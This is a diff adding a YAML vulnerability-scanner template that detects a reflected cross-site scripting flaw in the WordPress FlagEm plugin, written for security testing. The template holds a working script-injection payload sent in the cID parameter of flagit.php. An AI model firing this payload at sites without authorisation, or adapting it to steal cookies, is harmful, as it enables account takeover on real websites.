@@ -1,0 +1,52 @@
+id: wp-flagem-xss
+
+info:
+  name: WordPress FlagEm - Cross-Site Scripting
+  author: daffainfo
+  severity: high
+  description: WordPress FlagEm plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://www.exploit-db.com/exploits/38674
+    - https://vulners.com/packetstorm/PACKETSTORM:122505
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: wordpress,xss,wp-plugin,edb,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - '/wp-content/plugins/FlagEm/'
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "</script><script>alert(document.domain)</script>"
+        part: body
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100ca04bd9dc6cd4de9807890e9bb2b20092c14f6eb61b3b000b93445cd87d67039022100abba828c3923094424932428cebdddae2379dec600829994532940335d3d924a:922c64590222798bb761d5b6d8e72950
